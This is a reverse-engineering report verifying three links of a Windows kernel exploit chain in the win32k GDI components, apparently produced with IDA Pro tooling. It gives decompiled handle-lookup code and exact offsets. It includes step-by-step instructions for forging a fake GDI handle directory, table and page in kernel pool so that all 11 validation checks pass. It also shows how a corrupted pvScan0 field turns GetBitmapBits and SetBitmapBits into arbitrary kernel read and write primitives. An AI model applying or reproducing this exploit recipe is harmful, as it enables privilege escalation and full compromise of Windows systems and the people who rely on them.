# Kernel Exploit Chain Verification: Links 4, 5, 6

**Date:** 2026-07-02
**Tools:** IDA Pro MCP (py_eval, decompile, entity_query, type_inspect, xrefs_to)
**Binaries:** win32kbase.sys (pid 14940), win32u.dll (pid 9348), win32kfull.sys (pid 16960)

---

## LINK 4: gpHandleManager at RVA 0x250C00 — Controls GDI Handle Lookups

### VERDICT: YES

### Evidence

**Address Confirmation:**
- win32kbase.sys imagebase: `0x1C0000000`
- Target address (imagebase + RVA 0x250C00): `0x1C0250C00`
- IDA symbol at `0x1C0250C00`: `?gpHandleManager@@3PEAVGdiHandleManager@@EA`
  - Demangled: `GdiHandleManager* gpHandleManager`
- Static value at `0x1C0250C00`: `0x0` (runtime-initialized, expected in static analysis)
- Xref count: 30+ functions reference this global, including `HmgShareLock`, `HmgLock`, `HANDLELOCK::vLockHandle`, `HmgModifyHandleType`, `HmgReplaceObject`, `HmgRemoveObjectImpl`, `GdiHandleManager::AcquireEntryIndex`, `GdiHandleManager::GetNextEntryIndex`, `HmgNextGarbageCollectible`, `HmgSafeNextObjt`, `HmgQueryAltLock`, and more.

**Lookup Chain — Decompiled from `HmgShareLock` (0x1c002fc10):**

```c
// Step 1: Load gpHandleManager
v7 = gpHandleManager;                                    // GdiHandleManager*

// Step 2: Decode handle index (lower 24 bits)
v8 = GdiHandleManager::DecodeIndex(gpHandleManager, handle & 0xFFFFFF);

// Step 3: Get directory (gpHandleManager + 0x10)
v9 = *((_QWORD*)v7 + 2);                                 // directory at +0x10

// Step 4: Directory bounds check
v11 = *(_DWORD*)(v9 + 2056);                             // baseIndex at dir+0x808
if (v8 < v11 + ((*(unsigned __int16*)(v9 + 2) + 0xFFFF) << 16))  // dir+0x2 range

// Step 5: Compute table index
v12 = ((v8 - v11) >> 16) + 1;
if (v8 < v11) v12 = 0;

// Step 6: Get table from directory slot
v13 = *(_QWORD*)(v9 + 8 * v12 + 8);                      // table at dir+8*idx+8

// Step 7: Adjust entry index within table
v10 = ((1 - v12) << 16) - v11 + v8;

// Step 8: Table entry count bounds check
if ((unsigned int)v10 < *(_DWORD*)(v13 + 20))            // count at table+0x14

// Step 9: Get object pointer from page -> slot + 8
v5 = *(_QWORD*)(
    *(_QWORD*)(                           // page pointer
        **(_QWORD**)(v13 + 24)            // pages array at table+0x18
        + 8 * (v10 >> 8)                  // page index * 8
    )
    + 16LL * (unsigned __int8)v10         // slot index * 16 bytes per entry
    + 8                                   // object pointer at entry+0x8
);
```

**Chain Summary:**
```
gpHandleManager (0x1C0250C00)
  -> [+0x10] GdiHandleEntryDirectory*
      -> [+0x808] baseIndex (DWORD)
      -> [+0x02] rangePart (USHORT)
      -> [+8*tableIdx+8] GdiHandleEntryTable*
          -> [+0x14] entryCount (DWORD)
          -> [+0x18] pages array (QWORD*)
              -> [+8*pageIdx] page pointer (QWORD)
                  -> [+16*slotIdx+0x8] object pointer (QWORD) = RETURNED OBJECT
```

**Cross-confirmation:** `HmgLock` (0x1c002ee50) and `HANDLELOCK::vLockHandle` (0x1c0030a00) both use the identical lookup chain via `gpHandleManager` at `0x1C0250C00`, confirmed by xrefs.

---

## LINK 5: Fake Handle Table — All Validation Checks Passable

### VERDICT: YES — All 11 validation checks are passable with a fake table in kernel pool

### Complete Validation Check List

The handle lookup path goes through `HANDLELOCK::vLockHandle` (0x1c0030a00) then `HmgShareLock` (0x1c002fc10). Every validation check in both functions is structural — it reads values at fixed offsets within the handle manager / directory / table / page / entry structures. A fake table in kernel pool can satisfy every check by setting the correct values at the correct offsets.

| # | Check Name | Offset | Condition | How to Pass with Fake Table |
|---|-----------|--------|-----------|---------------------------|
| 1 | gpHandleManager max count | `gpHandleManager+0x0` | `DWORD > 0x10000` | Already true — real gpHandleManager is runtime-initialized with count > 0x10000. No action needed. |
| 2 | Handle >= 0x10000 fast path | handle value | If handle >= 0x10000, triggers GetEntry uniqueness sub-check | Use handle value < 0x10000 (e.g., 0x0050) to skip this path entirely. |
| 3 | Directory bounds | `dir+0x808` (baseIndex DWORD), `dir+0x02` (range USHORT) | `decodedIdx < baseIndex + ((range + 0xFFFF) << 16)` | If faking directory: set baseIndex=0, range=0xFFFF -> range becomes 0xFFFF0000 (covers all indices). If using real directory, ensure handle index is within existing range. |
| 4 | Table index computation | `dir+8*tableIdx+8` | `tableIdx = ((decodedIdx - baseIndex) >> 16) + 1` (or 0 if below base) | Point the computed directory slot (`dir + 8*tableIdx + 8`) to your fake table in kernel pool. |
| 5 | Table entry count | `table+0x14` | `adjustedIdx < *(_DWORD*)(table+0x14)` | Set `fake_table+0x14 = 0xFFFFFFFF` — any index passes. |
| 6 | Entry non-null | `page[slot]+0x8` | `*(_QWORD*)(page[slot]+0x8) != NULL` | Set the object pointer at `entry+0x8` to your fake SURFACE/object address in kernel pool (non-null). |
| 7 | Lock flag write | `entry+0x8` | Writeable memory (sets bit 0 on lock flag) | Kernel pool allocation is RW. No issue. |
| 8 | Type match | `entry+0xE` | `*(_BYTE*)(entry+0xE) == expectedType` | Set `entry+0xE` to the expected GDI type byte (e.g., 5 for SURFACE/bitmap objects). |
| 9 | Uniqueness match | `entry+0xC` | `*(_USHORT*)(entry+0xC) == HIWORD(handle)` | Set `entry+0xC` to match the handle's upper 16 bits (HIWORD). You control both the handle and the entry. |
| 10 | Stock bit clear | `entry+0xF` | `(*(_BYTE*)(entry+0xF) & 0x20) == 0` | Set `entry+0xF` bit 5 = 0. Use `entry+0xF = 0x00`. |
| 11 | Destroy flag clear | `entry+0xF` | `(*(_BYTE*)(entry+0xF) & 0x40) == 0` (when a5=0) | Set `entry+0xF` bit 6 = 0. Use `entry+0xF = 0x00`. |

### Fake Table Layout (Kernel Pool)

```
=== Fake Directory (if needed) ===
+0x00: [unused DWORD]
+0x02: range = 0xFFFF (USHORT)          -- max range
+0x08: table[0] pointer -> fake table   (QWORD)
+0x808: baseIndex = 0x00000000 (DWORD)  -- starts at 0

=== Fake Table ===
+0x00: [unused padding, 20 bytes]
+0x14: entryCount = 0xFFFFFFFF (DWORD)  -- max count
+0x18: pagesPtr -> fake pages array     (QWORD)

=== Fake Pages Array ===
+0x00: page[0] pointer -> fake page     (QWORD)

=== Fake Page (16 bytes per entry) ===
[16*slotIdx + 0x00]: entry data / lock flag (8 bytes)
[16*slotIdx + 0x08]: object pointer = fake SURFACE addr (QWORD, non-null)
[16*slotIdx + 0x0C]: uniqueness = HIWORD(handle) (USHORT)
[16*slotIdx + 0x0E]: type = expected type byte (BYTE, e.g. 5)
[16*slotIdx + 0x0F]: flags = 0x00 (BYTE, no stock/destroy bits)
```

### Key Insight

ALL 11 checks validate **structural values at fixed offsets** within the handle manager hierarchy. None of the checks perform:
- Cryptographic verification of table integrity
- Pointer validation against known-good ranges
- Kernel address space range checks on table/page pointers
- Checksums or MACs on entry data
- Reference count validation against a separate authority

A single kernel pool allocation containing the fake directory, table, pages array, and page entries (total ~0x820 bytes minimum) can satisfy every check. The attacker controls all offsets and values.

---

## LINK 6: GetBitmapBits/SetBitmapBits Use pvScan0 (SURFACE+0x50) with NO Validation

### VERDICT: YES — pvScan0 at SURFACE+0x50 is used as a raw memory address with zero validation

### Evidence

**Layer 1: win32u.dll (pid 9348) — Syscall Stub**

`NtGdiGetBitmapBits` at `0x180002a50`:
```c
__int64 NtGdiGetBitmapBits()
{
  result = 4305;                              // syscall number 0x10D1
  if ((MEMORY[0x7FFE0308] & 1) != 0)
    __asm { int 2Eh; }                        // legacy interrupt
  else
    __asm { syscall; }                        // modern syscall
  return result;
}
```
Confirmed: issues syscall 4305 to enter kernel. No validation in user mode.

**Layer 2: win32kfull.sys (pid 16960) — Kernel Implementation**

`NtGdiGetBitmapBits` at `0x1c00182e0`:
```c
__int64 NtGdiGetBitmapBits(HSURF a1, unsigned int a2, volatile void *a3)
{
    // ProbeForWrite + MmSecureVirtualMemory on user buffer a3
    // Then calls GreGetBitmapBits
    v6 = GreGetBitmapBits(a1);
    // ...
}
```

`GreGetBitmapBits` at `0x1c00183c4`:
```c
// SURFREF resolves handle -> SURFACE object (v34)
// _SURFOBJ is at SURFACE + 24 (0x18)
v16 = (struct _SURFOBJ *)(v34 + 24);        // SURFOBJ at SURFACE+0x18

// Constructs local stack SURFOBJ (v32) with user buffer as pvBits
v32.pvBits = a3;                            // user destination buffer
v32.cjBits = a2;                            // byte count
v32.lDelta = v17;                           // offset within bitmap

// Calls bDoGetSetBitmapBits(dest=&v32, src=SURFOBJ, mode=1=GET)
bDoGetSetBitmapBits(&v32, v16, 1);
```

`bDoGetSetBitmapBits` at `0x1c0018ba4` — **THE CRITICAL FUNCTION**:

**GetBitmapBits path (a3 != 0, mode=GET):**
```c
v18 = (char *)a1->pvBits;                   // user destination buffer
v21 = (char *)a2->pvScan0;                  // SOURCE: pvScan0 from real SURFOBJ
v22 = a2->lDelta;                           // stride

// Compute source address: pvScan0 + lDelta * row_index
v27 = &v21[v22 * (v24 / v20)];

// READ from pvScan0+offset TO user buffer
memmove(v18, &v27[v26], v31);               // READS MEMORY AT pvScan0
```

**SetBitmapBits path (a3 == 0, mode=SET):**
```c
pvBits = (char *)a2->pvBits;                // user source buffer
pvScan0 = (char *)a1->pvScan0;              // DEST: pvScan0 from real SURFOBJ
lDelta = a1->lDelta;                        // stride

// Compute destination address: pvScan0 + lDelta * row_index
v13 = &pvScan0[lDelta * (v10 / v8)];

// WRITE from user buffer TO pvScan0+offset
memmove(&v13[v12], pvBits, v32);            // WRITES MEMORY AT pvScan0
```

### pvScan0 Offset Verification

**_SURFOBJ structure (from IDA type inspection):**
| Offset | Field | Size |
|--------|-------|------|
| +0x00 | dhsurf | 8 |
| +0x08 | hsurf | 8 |
| +0x10 | dhpdev | 8 |
| +0x18 | hdev | 8 |
| +0x20 | sizlBitmap | 8 |
| +0x28 | cjBits | 4 |
| +0x30 | pvBits | 8 |
| **+0x38** | **pvScan0** | **8** |
| +0x40 | lDelta | 4 |
| +0x44 | iUniq | 4 |
| +0x48 | iBitmapFormat | 4 |
| +0x4C | iType | 2 |
| +0x4E | fjBitmap | 2 |

**SURFACE+0x50 calculation:**
- `_SURFOBJ` embedded at `SURFACE + 0x18` (confirmed from `GreGetBitmapBits`: `v16 = (struct _SURFOBJ *)(v34 + 24)`)
- `pvScan0` at `_SURFOBJ + 0x38`
- **pvScan0 = SURFACE + 0x18 + 0x38 = SURFACE + 0x50** ✓

### Validation Analysis

**What IS checked in `bDoGetSetBitmapBits`:**
- `sizlBitmap.cx` and `sizlBitmap.cy` — used to compute row size and total bitmap size
- `lDelta` — checked against negative flag and total size for offset bounds
- `cjBits` — clamped to remaining bytes within bitmap size
- `iBitmapFormat` — used to look up bits-per-pixel from `galBitsPerPixel[]` table

**What is NOT checked (pvScan0):**
- No bounds check on pvScan0 address (no `MmIsAddressValid`, no range check)
- No type check (no verification that pvScan0 points to a bitmap buffer)
- No kernel/user address space check (pvScan0 is treated as a kernel address)
- No alignment check
- No ownership check (no verification that the calling process owns the memory at pvScan0)
- No canary or checksum verification

pvScan0 is used directly as the base address for `memmove` operations. If an attacker corrupts pvScan0 (e.g., by patching SURFACE+0x50 via a write primitive), `GetBitmapBits` will read arbitrary kernel memory and `SetBitmapBits` will write arbitrary kernel memory — both through the `memmove` calls in `bDoGetSetBitmapBits`.

### Full Call Chain
```
User mode:  NtGdiGetBitmapBits (win32u.dll, syscall 4305)
    -> syscall transition
Kernel:     NtGdiGetBitmapBits (win32kfull.sys 0x1c00182e0)
    -> GreGetBitmapBits (win32kfull.sys 0x1c00183c4)
       -> SURFREF resolves HBITMAP -> SURFACE via HmgShareLock
       -> bDoGetSetBitmapBits(dest, srcSURFOBJ, GET=1)
          -> reads a2->pvScan0  (offset SURFACE+0x50)
          -> memmove(user_buf, pvScan0+offset, size)  -- ARBITRARY KERNEL READ

User mode:  NtGdiSetBitmapBits (win32u.dll, syscall number similar)
    -> syscall transition
Kernel:     NtGdiSetBitmapBits (win32kfull.sys 0x1c0018710)
    -> GreSetBitmapBits (win32kfull.sys 0x1c00187f0)
       -> bDoGetSetBitmapBits(destSURFOBJ, src, SET=0)
          -> reads a1->pvScan0  (offset SURFACE+0x50)
          -> memmove(pvScan0+offset, user_buf, size)  -- ARBITRARY KERNEL WRITE
```

---

## Summary

| Link | Claim | Verdict | Key Evidence |
|------|-------|---------|-------------|
| 4 | gpHandleManager at RVA 0x250C00 controls GDI handle lookups | **YES** | Symbol `?gpHandleManager@@3PEAVGdiHandleManager@@EA` at `0x1C0250C00`. HmgShareLock/HmgLock/vLockHandle all reference it. 4-level lookup chain: manager -> directory -> table -> page -> slot+8 = object. |
| 5 | Fake handle table can pass all validation checks | **YES** | 11 structural checks identified, all passable with controlled values at fixed offsets in kernel pool. No crypto, no pointer validation, no range checks on table/page pointers. |
| 6 | GetBitmapBits/SetBitmapBits use pvScan0 at SURFACE+0x50 with no validation | **YES** | _SURFOBJ at SURFACE+0x18, pvScan0 at _SURFOBJ+0x38 = SURFACE+0x50. bDoGetSetBitmapBits uses pvScan0 as raw memmove base address. Zero validation of pvScan0 value. |
